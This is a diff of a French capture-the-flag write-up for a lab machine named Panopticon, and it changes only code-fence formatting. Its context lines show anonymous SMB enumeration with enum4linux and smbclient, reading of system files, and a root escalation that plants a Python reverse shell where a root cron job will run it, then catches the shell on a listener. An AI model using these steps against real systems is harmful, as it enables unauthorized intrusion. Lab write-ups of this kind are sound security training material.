@@ -17,7 +17,7 @@ La machine dispose d'un serveur SSH, d'un serveur web Apache ainsi que des ports
 
 L'utilitaire *enum4linux* est généralement utile pour l'énumération SMB. Il indique ici la présence d'un partage de fichier et la possibilité des connexions anonymes (NULL sessions):  
 
-```plain
+```
  =========================================
 |    Nbtstat Information for 10.1.1.34    |
  =========================================
@@ -38,7 +38,7 @@ Looking up status of 10.1.1.34
 
 Le partage se nomme *public* :  
 
-```plain
+```
 [+] Attempting to map shares on 10.1.1.34
 //10.1.1.34/public  Mapping: OK, Listing: OK
 //10.1.1.34/IPC$    [E] Can't understand response:
@@ -46,7 +46,7 @@ Le partage se nomme *public* :
 
 Et l'énumération des utilisateurs remonte deux entrées intéressantes :  
 
-```plain
+```
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\seer (Local User)
 S-1-22-1-1001 Unix User\guest (Local User)
@@ -54,7 +54,7 @@ S-1-22-1-1001 Unix User\guest (Local User)
 
 Voyons voir ce qu'il y a sur ce partage :  
 
-```plain
+```
 $ smbclient -U "" -N -I 10.1.1.34 //panopticon/public
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -90,7 +90,7 @@ L'utilisateur *seer* fait partie de la plupart des groupes que l'on voit de nos 
 
 En dehors du flag je remarque un fichier texte intéressant :  
 
-```plain
+```
 $ ls -l ..
 total 20
 drwxrwxrwx 2 root root 4096 Dec  2 16:21 dev_departement
@@ -116,7 +116,7 @@ Mais j'ai beau avoir placé un script ou un binaire à différents emplacements 
 
 Une recherche sur l'utilisateur courant a remonté une entrée étrange dans */etc/issue* :  
 
-```plain
+```
 seer@Panopticon:~$ grep -r seer /etc/ 2> /dev/null
 /etc/aliases:root: seer
 /etc/issue:2. in /home/seer/flag2.txt
@@ -155,7 +155,7 @@ Il semble que le premier flag ne soit plus d'actualité. Cela ne nous avance pas
 
 En revanche la recherche a mis en évidence l'alias mail de *seer* pour root (dans */etc/aliases*) et effectivement au bout d'un moment j'ai la notification d'un mail reçu dans le terminal.  
 
-```plain
+```
 seer@Panopticon:~$ mail
 "/var/mail/seer": 26307 messages 26307 new
 >N   1 seer               Fri Feb 23 21:26  16/729   *** SECURITY information for Panopticon.Panopticon ***
@@ -178,7 +178,7 @@ Favicon
 
 Finalement nouveau mail reçu :  
 
-```plain
+```
 You have new mail in /var/mail/seer
  U2625 Cron Daemon        Sun Dec  2 14:48  23/849   Cron <root@Panopticon> bash /var/tmp/.lol.sh
 python3: can't open file '*.py': [Errno 2] No such file or directory
@@ -188,13 +188,13 @@ J'aurais du aller lire le dernier email directement :p
 
 On a donc un script dans */var/tmp* qui essaye d'exécuter tous les scripts Python (on suppose dans le même dossier car le script n'est pas lisible) :  
 
-```plain
+```
 -rwx------ 1 root root 125 Jun 27 14:38 /var/tmp/.lol.sh
 ```
 
 J'ai eu recours [au reverse shell PTY Python d'Infodox](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py) et après un moment ça a payé :  
 
-```plain
+```
 $ python2 tcp_pty_shell_handler.py -b 0.0.0.0:7777
 root@Panopticon:/home/seer/dev_departement# id
 uid=0(root) gid=0(root) groups=0(root)
